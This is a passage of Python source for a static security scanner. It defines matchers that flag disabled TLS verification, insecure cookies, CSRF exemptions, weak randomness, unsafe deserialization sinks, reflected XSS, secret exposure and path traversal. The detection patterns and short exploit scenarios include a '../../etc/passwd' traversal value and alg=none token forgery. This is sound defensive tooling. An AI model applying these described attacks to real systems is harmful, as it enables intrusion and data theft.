        norm = sl.replace('"', "'").replace(" ", "")   # quote/space-insensitive
        weak = ("verify=false" in norm or "verify_signature':false" in norm or
                "algorithms=none" in norm or "algorithms=['none']" in norm or
                ("'none'" in norm and "alg" in norm) or
                ("decode(" in sl and "verify" not in sl and "secret" not in sl
                 and "algorithms" not in sl and "key" not in sl))
        if not weak:
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.5,
            explanation=(f"`{unit['qualname']}` appears to decode a JWT without verifying its signature "
                         f"(or allows the `none` algorithm)."),
            exploit_scenario="Forge a token (alg=none or unsigned) to impersonate any user.",
            remediation="Always verify the signature with a fixed expected algorithm; never accept `none`.",
        )]


class TLSVerificationMatcher(BaseMatcher):
    """Disabled TLS certificate verification (CWE-295): the client accepts ANY
    certificate, so a network attacker can MITM the 'encrypted' channel."""
    id = "tls-verification-disabled"
    name = "Disabled TLS Certificate Verification"
    cwe = "CWE-295"
    default_severity = "HIGH"

    def match(self, unit, context):
        s = _code(unit)
        sl = s.lower()
        weak = (re.search(r"verify\s*=\s*false\b", sl) or
                "ssl._create_unverified_context" in sl or
                "_create_unverified_https_context" in sl or
                re.search(r"cert_reqs\s*=\s*(ssl\.)?cert_none", sl) or
                re.search(r"check_hostname\s*=\s*false", sl) or
                re.search(r"curlopt_ssl_verify(peer|host)\s*,\s*(0|false)", sl) or
                re.search(r"rejectunauthorized\s*:\s*false", sl))
        if not weak:
            return []
        # FP guard: `verify=False` on a non-TLS call is unlikely, but require a
        # network/TLS context token to be safe.
        if re.search(r"verify\s*=\s*false\b", sl) and not re.search(
                r"requests\.|httpx\.|session\.|urlopen|\.get\(|\.post\(|aiohttp|urllib|ssl|http", sl):
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.6,
            explanation=(f"`{unit['qualname']}` disables TLS certificate verification, so any "
                         f"certificate (including an attacker's) is accepted and the connection can be "
                         f"transparently intercepted."),
            exploit_scenario="A man-in-the-middle presents a self-signed cert; the client accepts it and leaks/alters data.",
            remediation="Never disable verification; keep verify=True and trust the system CA store (or pin a known CA).",
        )]


class InsecureCookieMatcher(BaseMatcher):
    """Session/auth cookie set without HttpOnly+Secure (CWE-1004/CWE-614):
    readable by JavaScript (XSS theft) and/or sent over plaintext HTTP."""
    id = "insecure-cookie"
    name = "Insecure Cookie Flags (session/auth)"
    cwe = "CWE-1004"
    default_severity = "MEDIUM"

    def match(self, unit, context):
        if not _reachable(unit):
            return []
        s = _code(unit)
        sl = s.lower()
        if "set_cookie" not in sl and "set-cookie" not in sl:
            return []
        # only a SENSITIVE cookie warrants a finding (auth/session/token/etc.) --
        # a UI-preference cookie without HttpOnly is not a security flaw.
        sensitive = re.search(
            r"set_cookie\s*\(\s*['\"]?\w*(session|auth|token|sid|jwt|remember|login|csrf|secret|access)",
            sl)
        if not sensitive:
            return []
        flat = sl.replace(" ", "")
        has_httponly = "httponly=true" in flat
        has_secure = "secure=true" in flat
        if has_httponly and has_secure:
            return []
        missing = []
        if not has_httponly:
            missing.append("HttpOnly")
        if not has_secure:
            missing.append("Secure")
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.55,
            explanation=(f"`{unit['qualname']}` sets a session/auth cookie without the "
                         f"{' and '.join(missing)} flag(s). Without HttpOnly the cookie is readable by "
                         f"JavaScript (stolen via XSS); without Secure it is sent over plaintext HTTP."),
            exploit_scenario="Steal the session cookie via XSS (no HttpOnly) or sniff it on the network (no Secure).",
            remediation="Set the cookie with httponly=True, secure=True and samesite='Lax' (or 'Strict').",
        )]


class CSRFDisabledMatcher(BaseMatcher):
    """CSRF protection explicitly disabled/exempted (CWE-352)."""
    id = "csrf-disabled"
    name = "CSRF Protection Disabled"
    cwe = "CWE-352"
    default_severity = "MEDIUM"

    def match(self, unit, context):
        s = _code(unit)
        flat = s.lower().replace(" ", "")
        weak = (re.search(r"wtf_csrf_enabled['\"]?\]?\s*[=:]\s*false", flat) or
                "wtf_csrf_enabled=false" in flat or
                re.search(r"csrf_enabled['\"]?\]?\s*[=:]\s*false", flat) or
                "csrf.exempt" in flat or "@csrf_exempt" in flat or
                "csrf_exempt=true" in flat or
                re.search(r"wtf_csrf_check_default['\"]?\]?\s*[=:]\s*false", flat))
        if not weak:
            return []
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.55,
            explanation=(f"`{unit['qualname']}` disables or exempts CSRF protection. State-changing "
                         f"requests can then be forged from a malicious site using the victim's cookies."),
            exploit_scenario="Host a page that auto-submits a form to this endpoint; the victim's browser sends their cookies.",
            remediation="Keep CSRF protection enabled; use per-request tokens (or SameSite cookies + same-origin checks).",
        )]


class InsecureRandomnessMatcher(BaseMatcher):
    """Non-cryptographic RNG used to generate a security value (CWE-330):
    random.* is predictable, so tokens/passwords/OTPs can be guessed."""
    id = "insecure-randomness"
    name = "Insecure Randomness for Security Value"
    cwe = "CWE-330"
    default_severity = "MEDIUM"

    _RAND = r"random\.(random|randint|randrange|choice|choices|getrandbits|shuffle|sample|uniform)\s*\("
    _SEC = r"(token|password|passwd|secret|otp|nonce|salt|csrf|reset_code|reset_token|api_?key|session_?id|auth_?code|verification_?code)"
    # security terms that, when present in the FUNCTION NAME, put the random call
    # in a security context even if no keyword sits near the call itself.
    _NAME_SEC = ("otp", "token", "password", "passwd", "nonce", "salt", "secret",
                 "csrf", "reset_code", "reset_token", "api_key", "session_id",
                 "auth_code", "verification_code")

    def _name_is_security(self, *names):
        # match a term as a boundary/underscore-delimited segment (so `otp` and
        # `generate_reset_token` match, but `tokenize`/`assault` do not).
        for nm in names:
            nm = (nm or "").lower()
            for t in self._NAME_SEC:
                if re.search(r"(?:^|_)" + re.escape(t) + r"(?:_|$|[0-9])", nm):
                    return True
        return False

    def match(self, unit, context):
        s = _code(unit)
        sl = s.lower()
        if not re.search(self._RAND, sl):
            return []
        # using a secure RNG (secrets / SystemRandom) in the same unit -> assume OK
        if "secrets." in sl or "systemrandom" in sl:
            return []
        # the random call must be in a SECURITY context: a security keyword within
        # ~50 chars of the random call (same statement), not merely elsewhere.
        near = re.search(self._SEC + r"[^\n]{0,50}?" + self._RAND, sl) or \
               re.search(self._RAND + r"[^\n]{0,50}?" + self._SEC, sl)
        # ALSO a security context when the FUNCTION NAME itself denotes a security
        # value (e.g. `def otp(): return random.randint(...)`), where the keyword
        # is in the name rather than near the call -- which the proximity check
        # above (single-line, <=50 chars) cannot see.
        name_sec = self._name_is_security(unit.get("name"),
                                          (unit.get("qualname") or "").split(".")[-1])
        if not (near or name_sec):
            # No security keyword/name context, but `random` is still a
            # non-cryptographic PRNG. Following Bandit B311, flag any use of its
            # weak generators as a LOW-severity advisory: the output is
            # predictable, which is fine for sampling/simulation but unsafe if the
            # value ever needs to be unguessable. A secure RNG in the same unit was
            # already excluded above.
            return [self._finding(
                self, unit, severity="LOW", confidence=0.4,
                explanation=(f"`{unit['qualname']}` uses the non-cryptographic `random` module. Its "
                             f"output is predictable (the generator is seeded from time/PID). This is "
                             f"fine for sampling or simulation, but insecure if the value must be "
                             f"unguessable (tokens, IDs, keys)."),
                exploit_scenario="If this value is used anywhere security-relevant, an attacker can "
                                 "predict the PRNG sequence and reproduce it.",
                remediation="If the value must be unpredictable, use the `secrets` module "
                            "(secrets.randbelow / token_hex / token_urlsafe).",
            )]
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.55,
            explanation=(f"`{unit['qualname']}` uses the non-cryptographic `random` module to generate a "
                         f"security-sensitive value. Its output is predictable, so tokens/passwords/OTPs "
                         f"can be reproduced by an attacker."),
            exploit_scenario="Predict the RNG state (seeded by time/PID) to forge a valid token, OTP or reset code.",
            remediation="Use the `secrets` module (secrets.token_hex / token_urlsafe / randbelow) for all security values.",
        )]


class FilePermissionsMatcher(BaseMatcher):
    """World-writable file permissions (CWE-732): any local user can modify the
    file (e.g. tamper with code, config, or uploaded content)."""
    id = "permissive-file-permissions"
    name = "Overly Permissive File Permissions"
    cwe = "CWE-732"
    default_severity = "MEDIUM"

    def match(self, unit, context):
        s = _code(unit)
        sl = s.lower()
        # chmod with a world-writable mode: last octal digit has the write bit
        # (2,3,6,7) -> e.g. 0o777, 0o666, 0o757. Also catch python2 '0777'.
        weak = re.search(r"chmod\s*\([^)]*0o?[0-7]{0,2}[2367]\s*[\),]", sl) or \
               re.search(r"chmod\s*\([^)]*,\s*(511|438|509|493)\s*\)", sl) or \
               "s_iwoth" in sl or "s_irwxo" in sl
        if not weak:
            return []
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.6,
            explanation=(f"`{unit['qualname']}` sets world-writable file permissions. Any local user can "
                         f"modify the file, enabling tampering with code, configuration or data."),
            exploit_scenario="A local user rewrites the world-writable file (e.g. a script that later runs as another user).",
            remediation="Grant the least permission needed (e.g. 0o600 for secrets, 0o644 for read-only data); never world-writable.",
        )]


class InsecureTempFileMatcher(BaseMatcher):
    """Insecure temporary file (CWE-377): `tempfile.mktemp()` (and the bare
    `mktemp()`) only RETURN a path -- the file is not atomically created, so the
    predictable name leaves a TOCTOU window in which an attacker can pre-create
    or symlink the path. The safe APIs (mkstemp / NamedTemporaryFile /
    TemporaryFile / mkdtemp / TemporaryDirectory) create the file/handle
    atomically and are NOT flagged."""
    id = "insecure-temp-file"
    name = "Insecure Temporary File"
    cwe = "CWE-377"
    default_severity = "MEDIUM"

    def match(self, unit, context):
        s = _code(unit)
        # blank string literals so a `mktemp` mentioned inside a quoted string
        # (e.g. a shell-command string, a log message) does not count.
        no_str = re.sub(r'"[^"]*"', '""', s)
        no_str = re.sub(r"'[^']*'", "''", no_str)
        # `\bmktemp(` matches `tempfile.mktemp(` and a bare `mktemp(`, but NOT the
        # safe forms mkstemp/mkdtemp/NamedTemporaryFile/TemporaryFile/
        # TemporaryDirectory (none of which contain the token `mktemp`).
        if not re.search(r"\bmktemp\s*\(", no_str):
            return []
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.6,
            explanation=(f"`{unit['qualname']}` creates a temporary file via `mktemp()`, which only "
                         f"returns a path without atomically creating the file. The name is "
                         f"predictable and a TOCTOU gap exists before the file is opened."),
            exploit_scenario="Pre-create or symlink the predictable temp path between mktemp() and the open to read or overwrite the victim's data.",
            remediation="Use tempfile.mkstemp() / NamedTemporaryFile() / TemporaryFile() (or mkdtemp/TemporaryDirectory), which atomically create a uniquely-named file/handle.",
        )]


class DangerousSinkMatcher(BaseMatcher):
    """Catastrophic sinks that are dangerous with ANY non-constant input, even a
    bare function parameter (no traced request source). The taint engine is
    intra-procedural source->sink, so a standalone helper like
    `def f(data): pickle.loads(data)` -- a sink acting on a PARAMETER with no
    in-function source -- is otherwise missed. A small set of sinks
    (eval/exec/pickle/yaml-unsafe/marshal) are RCE-class regardless of whether the
    source can be proven, so we flag them on any variable/attribute/call/f-string
    argument. We deliberately do NOT flag a LITERAL-constant argument
    (e.g. `eval("1+2")`), and identical (type,file,function) findings are merged
    with the taint engine's (its dataflow proof wins) so there is never a
    double-report."""
    id = "dangerous-sink"
    name = "Dangerous Sink"            # per-finding type is set explicitly below
    cwe = "CWE-94"                     # default; overridden per sink

    # Per-language catastrophic sinks -> (finding type, cwe, severity). Types/cwes
    # match the taint engine exactly so the merge step de-duplicates cleanly.
    _SINKS_BY_LANG = {
        "python": [
            (r"\beval\s*\(",            "Code Injection",            "CWE-94",  "CRITICAL"),
            (r"\bexec\s*\(",            "Code Injection",            "CWE-94",  "CRITICAL"),
            (r"\bpickle\.loads?\s*\(",  "Insecure Deserialization",  "CWE-502", "CRITICAL"),
            (r"\bcPickle\.loads?\s*\(", "Insecure Deserialization",  "CWE-502", "CRITICAL"),
            (r"\bmarshal\.loads\s*\(",  "Insecure Deserialization",  "CWE-502", "HIGH"),
            (r"\byaml\.unsafe_load\s*\(", "Insecure Deserialization", "CWE-502", "CRITICAL"),
        ],
        "javascript": [
            (r"\beval\s*\(",            "Code Injection",            "CWE-94",  "CRITICAL"),
            (r"\bnew\s+Function\s*\(",  "Code Injection",            "CWE-94",  "CRITICAL"),
            (r"\bvm\.runInThisContext\s*\(", "Code Injection",       "CWE-94",  "CRITICAL"),
        ],
        "php": [
            (r"\beval\s*\(",            "Code Injection",            "CWE-94",  "CRITICAL"),
            (r"\bcreate_function\s*\(", "Code Injection",            "CWE-94",  "HIGH"),
            # NOTE: assert() is NOT included -- in modern PHP it is overwhelmingly
            # used for test/assertions (non-string arg), so flagging it would
            # false-positive heavily. PHP unserialize() is covered by
            # InsecureDeserializationMatcher; adding it here would double-report.
        ],
    }
    # yaml.load(...) is only unsafe WITHOUT a safe Loader= (python only)
    _YAML_LOAD = r"\byaml\.load\s*\("
    _YAML_SAFE = r"(SafeLoader|CSafeLoader|safe_load)"

    def _arg_is_nonconstant(self, call_text):
        """True when the call's argument list contains a name/attribute/call/
        f-string (attacker-influenceable), NOT a pure literal. `eval("1+2")` or
        `pickle.loads(b'...')` (a sole literal) returns False."""
        m = re.search(r"\(\s*(.*)$", call_text, re.DOTALL)
        if not m:
            return False
        inner = m.group(1)
        # take up to the matching-ish end of the first argument region
        inner = inner.split("\n")[0]
        # an f-string / format / PHP interpolation is dynamic
        if re.search(r"f['\"]|\.format\s*\(|%\s*[a-zA-Z_(]|\$\w+|`[^`]*\$\{", inner):
            return True
        # strip whole string/bytes literals; if a bare identifier or attribute or
        # call remains, the argument is non-constant
        stripped = re.sub(r"(b|r|rb|br|f)?'[^']*'", "", inner)
        stripped = re.sub(r'(b|r|rb|br|f)?"[^"]*"', "", stripped)
        return bool(re.search(r"[A-Za-z_$]\w*", stripped))

    def match(self, unit, context):
        from matchers.base import Finding
        lang = unit.get("language")
        sinks = self._SINKS_BY_LANG.get(lang)
        if not sinks:
            return []
        raw = _src(unit)
        out = []
        seen = set()
        for i, line in enumerate(raw.split("\n")):
            ln = re.sub(r"(#|//).*", "", line)       # drop line comments (py/js)
            for pat, ftype, cwe, sev in sinks:
                m = re.search(pat, ln)
                if not m:
                    continue
                if not self._arg_is_nonconstant(ln[m.start():]):
                    continue
                key = (ftype, i)
                if key in seen:
                    continue
                seen.add(key)
                out.append(Finding(
                    matcher_id=self.id, type=ftype, cwe=cwe, severity=sev,
                    confidence=0.7, file=unit["file"], language=unit["language"],
                    function=unit.get("qualname", unit.get("name", "<module>")),
                    lineno=unit.get("lineno", 0) + i, end_lineno=unit.get("end_lineno", 0),
                    source=unit.get("source", ""),
                    explanation=(f"`{unit.get('qualname','<fn>')}` passes a non-constant value to a "
                                 f"catastrophic sink ({ftype}). This is RCE-class with any "
                                 f"attacker-influenced input, even via a function parameter."),
                    exploit_scenario="Supplying crafted input to this sink executes arbitrary code / "
                                     "deserializes an attacker object, leading to remote code execution.",
                    remediation=("Never eval/exec dynamic input (use a safe parser or explicit "
                                 "dispatch); never unpickle/unserialize/marshal/yaml.unsafe_load "
                                 "untrusted data (use json or a safe loader)."),
                    detection_method="static-heuristic",
                ))
            # yaml.load without a safe Loader (python only)
            if lang == "python":
                ym = re.search(self._YAML_LOAD, ln)
                if ym and not re.search(self._YAML_SAFE, ln) and self._arg_is_nonconstant(ln[ym.start():]):
                    key = ("Insecure Deserialization", i)
                    if key not in seen:
                        seen.add(key)
                        out.append(Finding(
                            matcher_id=self.id, type="Insecure Deserialization", cwe="CWE-502",
                            severity="CRITICAL", confidence=0.7, file=unit["file"],
                            language=unit["language"],
                            function=unit.get("qualname", unit.get("name", "<module>")),
                            lineno=unit.get("lineno", 0) + i, end_lineno=unit.get("end_lineno", 0),
                            source=unit.get("source", ""),
                            explanation=(f"`{unit.get('qualname','<fn>')}` calls yaml.load without a "
                                         f"safe Loader= on a non-constant value -- full deserialization."),
                            exploit_scenario="A crafted YAML payload constructs arbitrary Python "
                                             "objects (RCE) when loaded without SafeLoader.",
                            remediation="Use yaml.safe_load() or pass Loader=yaml.SafeLoader.",
                            detection_method="static-heuristic",
                        ))
        return out


class ReflectedXSSMatcher(BaseMatcher):
    """Reflected XSS: user input is written into an HTML response without
    escaping. Precise gate -- requires (1) a request handler, (2) it reads user
    input, (3) an HTML-tag string literal is concatenated/interpolated with a
    variable in a return/echo/response, and (4) NO HTML escaping/sanitiser and
    NOT a JSON response. This avoids flagging escaped output or JSON APIs."""
    id = "reflected-xss"
    name = "Reflected Cross-Site Scripting (XSS)"
    cwe = "CWE-79"
    default_severity = "HIGH"
    languages = {"python", "javascript", "typescript", "tsx", "php", "ruby"}

    def match(self, unit, context):
        from matchers.builtin import _is_request_handler, _unit_has_route
        if not (_is_request_handler(unit) or _unit_has_route(unit, context)):
            return []
        code = _code(unit)
        reads_input = bool(re.search(
            r"request\.(args|form|values|GET|POST|params|query|data|cookies|json)"
            r"|req\.(query|body|params|cookies)|\$_(GET|POST|REQUEST|COOKIE)"
            r"|getParameter\s*\(|params\[", code))
        if not reads_input:
            return []
        # escaped / sanitised / JSON response -> not reflected XSS. Includes the
        # WordPress escaping API (esc_html / esc_attr / esc_url / esc_textarea /
        # esc_js / wp_kses* / tag_escape / *_e echo variants), which is the
        # canonical output-encoding in WP themes/admin and was previously missed.
        if re.search(r"escape\s*\(|markupsafe|Markup\s*\(|bleach\.|html\.escape"
                     r"|htmlspecialchars|htmlentities|encodeURIComponent|DOMPurify"
                     r"|esc_html|esc_attr|esc_url|esc_textarea|esc_js|esc_xml"
                     r"|wp_kses|tag_escape|absint\s*\(|sanitize_|antispambot"
                     r"|sanitiz|jsonify|JSON\.stringify|\.json\s*\(|render_template\s*\(",
                     code, re.I):
            return []
        # an HTML-tag string literal concatenated/interpolated with a variable,
        # emitted in a return/echo/response
        emit = r"(return|echo|print|res\.send|res\.write|res\.end|response\.write|send\s*\()"
        html_lit = r"['\"][^'\"]*<\s*[a-zA-Z/!][^>]*>"
        xss = (
            re.search(emit + r"[^\n]*" + html_lit + r"[^'\"]*['\"]\s*[.+]\s*\$?[a-zA-Z_]", code)
            or re.search(emit + r"[^\n]*\$?[a-zA-Z_]\w*\s*[.+]\s*" + html_lit, code)
            or re.search(emit + r"[^\n]*(f['\"]|`)[^'\"`]*<\s*[a-zA-Z/][^>]*>[^'\"`]*"
                         r"(\{[^}]+\}|\$\{[^}]+\})", code)
        )
        # 4th shape: printf-style %-formatting of an HTML-tag literal with a
        # request value, e.g.  return "<h1>%s</h1>" % request.args.get("x").
        # Stays precise by requiring the %-operand to BE a request source: a
        # constant operand will not match, and an escaped value is already
        # excluded above (escape/markupsafe/htmlspecialchars...). This is also the
        # %-shape's own proof of request-taint, since the generic helper below
        # only models concatenation / f-strings, not %-formatting.
        req_src = (r"(?:request\.(?:args|form|values|GET|POST|params|query|data|cookies|json)"
                   r"|req\.(?:query|body|params|cookies)|\$_(?:GET|POST|REQUEST|COOKIE)"
                   r"|getParameter\s*\(|params\[)")
        pct_xss = re.search(
            emit + r"[^\n]*" + html_lit + r"[^'\"]*['\"]\s*%\s*[^\n]*?" + req_src, code)
        # also the %-operand may be a VARIABLE that was assigned from a request
        # source earlier in the handler, e.g.  n = request.args.get("n"); ...
        # return "<div>%s</div>" % n  -- the inline req_src check above misses this
        # (the operand is `n`, not the request call), so verify the operand var is
        # request-tainted in the function body. An escaped value is already
        # excluded at the top, so this stays precise.
        if not pct_xss:
            pm = re.search(emit + r"[^\n]*" + html_lit + r"[^'\"]*['\"]\s*%\s*\(?\s*(?P<op>[a-zA-Z_]\w*)",
                           code)
            if pm and re.search(re.escape(pm.group("op")) + r"\s*=\s*[^\n]*" + req_src, code):
                pct_xss = pm
        if not (xss or pct_xss):
            return []
        # The value written into HTML must actually derive from a request source
        # (not a sanitised parameter or stored/internal value that merely
        # co-occurs with an unrelated superglobal read elsewhere in the handler).
        if not (S.xss_output_is_request_tainted(code, unit["language"]) or pct_xss):
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.8,
            explanation=(f"`{unit['qualname']}` writes user input into an HTML response without "
                         f"escaping, allowing reflected XSS: an attacker can inject "
                         f"<script> or event-handler markup that runs in the victim's browser."),
            exploit_scenario="Send a crafted query value containing markup; it is reflected verbatim "
                             "into the HTML response and executes in the victim's session.",
            remediation="HTML-escape all user input before rendering (e.g. markupsafe.escape / "
                        "html.escape / a templating auto-escaper), or return JSON instead of raw HTML.",
        )]


class SensitiveInfoExposureMatcher(BaseMatcher):
    """Sensitive information exposure: a request handler returns secrets/env to
    the client. Precise gate -- the value returned to the client is either an
    environment-variable read or a value whose name strongly denotes a secret."""
    id = "sensitive-info-exposure"
    name = "Sensitive Information Exposure"
    cwe = "CWE-200"
    default_severity = "MEDIUM"

    def match(self, unit, context):
        from matchers.builtin import _is_request_handler, _unit_has_route
        if not (_is_request_handler(unit) or _unit_has_route(unit, context)):
            return []
        code = _code(unit)
        emit = r"(return|echo|res\.send|res\.json|res\.write|print|response\.write)"
        # 1) environment / server config returned straight to the client
        env_leak = re.search(emit + r"[^\n]*(os\.environ|os\.getenv\s*\(|process\.env"
                             r"|\$_ENV|\$_SERVER|getenv\s*\()", code)
        # 2) a value whose NAME strongly denotes a secret returned to the client.
        #    Match only a real VARIABLE/property reference, not the secret word
        #    appearing inside a quoted string (error messages, field labels, and
        #    translated UI text such as "Please enter your password" are not
        #    leaks). Strings are blanked first so only live identifiers match.
        code_nostr = re.sub(r"'[^'\n]*'", "''", re.sub(r'"[^"\n]*"', '""', code))
        secret_leak = re.search(
            emit + r"[^\n]*(?:\$|self\.|this\.|->|\bvar\s+|\blet\s+|\bconst\s+|[:{,]\s*)"
            r"\w*(secret_?key|secretkey|password|passwd|api_?key|"
            r"private_?key|access_?token|client_?secret|aws_secret|db_password)\b",
            code_nostr, re.I)
        if not (env_leak or secret_leak):
            return []
        what = "environment/server configuration" if env_leak else "a secret value"
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.75,
            explanation=(f"`{unit['qualname']}` returns {what} directly to the client, exposing "
                         f"secrets (API keys, credentials, internal config) that should never "
                         f"leave the server."),
            exploit_scenario="Call the endpoint and read secret keys / credentials straight from the "
                             "HTTP response, then use them to escalate access.",
            remediation="Never return environment variables or secrets to clients. Return only the "
                        "specific non-sensitive fields required, and keep secrets server-side.",
        )]


class PathJoinTraversalMatcher(BaseMatcher):
    """Path traversal where a file path is BUILT by joining a function PARAMETER
    into a string literal that contains a path separator -- e.g.
    `open(f"/tmp/{filename}")`, `readfile("/var/www/" . $file)`,
    `open(base + "/" + name)`. The general PathTraversalMatcher gates on request
    reachability (to avoid flagging every file helper), so a plain helper that
    builds `<fixed dir>/<param>` and opens it is otherwise missed. This pattern is
    much narrower than `open(param)`: it requires BOTH a separator-bearing literal
    AND a parameter joined into it (interpolation or concatenation), which is the
    classic "drop user input into a fixed directory" traversal shape. A bare
    `open(param)` (no path building) and a pure-constant path do NOT match."""
    id = "path-join-traversal"
    name = "Path Traversal"
    cwe = "CWE-22"
    default_severity = "HIGH"

    _FILE_OPS = (r"open|readfile|file_get_contents|file_put_contents|fopen|sendfile|"
                 r"readFile|readFileSync|writeFile|writeFileSync|createReadStream|"
                 r"unlink|unlinkSync|include|require|include_once|require_once")
    # a string literal that contains a path separator
    _SEP_LIT = r"""(?:'[^']*[/\\][^']*'|"[^"]*[/\\][^"]*")"""

    def match(self, unit, context):
        from matchers.base import Finding
        lang = unit.get("language")
        if lang not in ("python", "php", "javascript", "typescript"):
            return []
        raw = _src(unit)
        params = set(unit.get("params", []) or [])
        #  also accept local variables that were ASSIGNED from a tainted
        # source within the same function. The original only accepted function
        # parameters, missing cases like:
        #   $tpl = $_GET['template']; include('/dir/' . $tpl);
        # where $tpl is a local var, not a parameter. We scan the unit source
        # for `$var = $_GET/$_POST/...` and add those vars to the tainted set.
        tainted_locals = set()
        src_lower = raw.lower()
        # PHP: $var = $_GET['x'] / $var = $_POST['x'] / $var = $_REQUEST['x']
        for m in re.finditer(r"\$(\w+)\s*=\s*\$_(?:GET|POST|REQUEST|COOKIE|FILES)\s*\[", raw):
            tainted_locals.add(m.group(1))
        # Python: var = request.args.get('x') / var = request.args['x']
        for m in re.finditer(r"(\w+)\s*=\s*request\.(?:args|form|values|json|data|cookies|headers|files)", raw):
            tainted_locals.add(m.group(1))
        # JS: var = req.query.x / var = req.body.x / var = req.params.x
        for m in re.finditer(r"(?:const|let|var)\s+(\w+)\s*=\s*req\.(?:query|body|params|headers)", raw):
            tainted_locals.add(m.group(1))
        tainted_set = params | tainted_locals
        out = []
        seen = set()
        for i, line in enumerate(raw.split("\n")):
            ln = re.sub(r"(#|//).*", "", line)
            fm = re.search(r"(?:^|[^.\w])(?:" + self._FILE_OPS + r")\s*\(", ln)
            if not fm:
                continue
            # the file-op argument region (rough: up to end of line)
            arg = ln[fm.end():]
            # collect variable names joined into a separator-bearing path
            joined_vars = set()
            # f-string:  f"/dir/{var}"  ->  {var}
            if re.search(r"f['\"][^'\"]*[/\\][^'\"]*\{", arg):
                joined_vars |= set(re.findall(r"\{\s*([A-Za-z_]\w*)", arg))
            # concatenation with a separator literal:  "/dir/" + var  /  var + "/x"
            if re.search(self._SEP_LIT + r"\s*[.+]", arg) or \
               re.search(r"[.+]\s*" + self._SEP_LIT, arg):
                joined_vars |= set(re.findall(r"[.+]\s*\$?([A-Za-z_]\w*)", arg))
                joined_vars |= set(re.findall(r"\$?([A-Za-z_]\w*)\s*[.+]", arg))
            # PHP interpolation:  "/dir/$var"  (separator + $var inside one string)
            if lang == "php":
                for m in re.findall(r"""["'][^"']*[/\\][^"']*\$(\w+)""", arg):
                    joined_vars.add(m)
            # keep only joined vars that are tainted (params OR local-from-source)
            tainted = joined_vars & tainted_set
            if not tainted:
                continue
            key = i
            if key in seen:
                continue
            seen.add(key)
            who = ", ".join(sorted(tainted))
            out.append(Finding(
                matcher_id=self.id, type="Path Traversal", cwe="CWE-22",
                severity="HIGH", confidence=0.6, file=unit["file"], language=lang,
                function=unit.get("qualname", unit.get("name", "<module>")),
                lineno=unit.get("lineno", 0) + i, end_lineno=unit.get("end_lineno", 0),
                source=unit.get("source", ""),
                explanation=(f"`{unit.get('qualname','<fn>')}` builds a filesystem path by joining "
                             f"parameter `{who}` into a fixed directory and passes it to a file "
                             f"operation. Without canonicalisation, `../` sequences escape the intended "
                             f"directory (path traversal)."),
                exploit_scenario="Pass a value like `../../etc/passwd` for the joined parameter to read "
                                 "or write files outside the intended directory.",
                remediation=("Canonicalise with os.path.realpath()/realpath() and verify the result "
                             "stays within an allow-listed base directory; reject `..` and absolute "
                             "paths."),
                detection_method="static-heuristic",
            ))
        return out


EXTENDED_MATCHERS = [
    CommandInjectionMatcher(),
    PathTraversalMatcher(),
    PathJoinTraversalMatcher(),
    SSTIMatcher(),
    WeakCryptoMatcher(),
    OpenRedirectMatcher(),
    MassAssignmentMatcher(),
    XXEMatcher(),
    InsecureDeserializationMatcher(),
    MissingAuthMatcher(),
    DebugModeMatcher(),
    CORSMatcher(),
    JWTNoneMatcher(),
    TLSVerificationMatcher(),
    InsecureCookieMatcher(),
    CSRFDisabledMatcher(),
    InsecureRandomnessMatcher(),
    FilePermissionsMatcher(),
    InsecureTempFileMatcher(),
    DangerousSinkMatcher(),
    ReflectedXSSMatcher(),
    SensitiveInfoExposureMatcher(),
]
